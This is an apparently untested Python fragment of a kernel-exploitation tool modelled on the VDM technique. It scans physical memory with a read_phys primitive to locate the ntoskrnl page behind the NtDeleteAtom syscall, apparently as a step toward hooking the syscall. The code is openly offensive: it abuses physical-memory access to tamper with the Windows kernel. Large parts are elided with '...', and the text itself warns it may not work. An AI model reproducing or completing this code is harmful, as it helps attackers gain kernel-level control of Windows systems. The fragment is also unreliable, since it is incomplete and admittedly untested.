...
# Note: This is not tested and may not work as intended.

PAGE_4KB = 0x1000
STATUS_SUCCESS = 0x00000000

class PEPROCESS(ctypes.Structure):
    pass

class VDMContext:
    syscall_hook = ("NtDeleteAtom", "ntdll.dll")
    is_page_found = atomics.AtomicBool(False)
    syscall_address = atomics.AtomicPointer(None)
    nt_page_offset = 0
    nt_rva = 0
    ntoskrnl = None
    ...
    def locate_syscall(self, address, length):
        ...
        for page in range(0, length, PAGE_4KB):
            ...
            if not self.read_phys(address + page, page_data, PAGE_4KB):
                continue
            if ctypes.memcmp(page_data.raw[VDMContext.nt_page_offset:VDMContext.nt_page_offset + 32], 
                             self.ntoskrnl[self.nt_rva:self.nt_rva + 32], 32) == 0:
